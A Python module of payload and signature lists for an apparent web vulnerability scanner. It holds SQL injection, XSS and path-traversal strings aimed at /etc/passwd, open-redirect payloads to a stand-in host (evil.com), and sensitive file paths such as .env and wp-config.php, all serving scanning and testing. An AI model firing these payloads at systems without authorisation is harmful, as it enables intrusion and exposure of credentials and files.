"""Centralised payload and signature definitions for all checks."""

from typing import List

SQLI_ERROR_PAYLOADS: List[str] = [
    "'",
    "''",
    "`",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    '" OR "1"="1',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' AND SLEEP(2)--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR 'x'='x",
    "105 OR 1=1",
]

SQLI_ERROR_SIGNATURES: List[str] = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    # PostgreSQL
    "pg_query()",
    "pg_exec()",
    "unterminated quoted string at or near",
    # MSSQL
    "unclosed quotation mark",
    "incorrect syntax near",
    "mssql_query()",
    # Oracle
    "ora-01756",
    "oracle error",
    # SQLite
    "sqlite_error",
    "sqlite3.operationalerror",
    # Generic
    "syntax error",
    "sql syntax",
    "database error",
    "sql error",
    "odbc driver",
    "warning: pg_",
    "supplied argument is not a valid",
    "division by zero",
]

XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '"<script>alert(1)</script>',
    "';alert(1)//",
    '" onmouseover="alert(1)',
]

OPEN_REDIRECT_PAYLOADS: List[str] = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com/%2f..",
    "///evil.com",
    "\r\nhttps://evil.com",
]

REDIRECT_PARAMS: List[str] = [
    "url", "redirect", "redirect_url", "return", "return_url",
    "returnUrl", "return_to", "next", "target", "dest", "destination",
    "go", "goto", "forward", "continue", "r", "u", "link", "page", "ref",
]

TRAVERSAL_PAYLOADS: List[str] = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
]

TRAVERSAL_SIGNATURES: List[str] = [
    "root:x:0:0:",
    "root:*:0:0:",
    "[boot loader]",
    "daemon:x:",
    "/bin/bash",
    "# Copyright (c) 1993-2009 Microsoft Corp",
]

TRAVERSAL_FILE_PARAMS: List[str] = [
    "file", "path", "page", "template", "doc", "include",
    "load", "read", "document", "folder", "filename",
]

SENSITIVE_PATHS: List[str] = [
    "/.git/config",
    "/.env",
    "/phpinfo.php",
    "/server-status",
    "/.htaccess",
    "/web.config",
    "/config.php",
    "/wp-config.php",
    "/admin",
    "/administrator",
]

WEAK_CIPHERS: List[str] = [
    "RC4", "DES", "3DES", "MD5", "NULL", "EXPORT",
    "anon", "ADH", "AECDH",
]
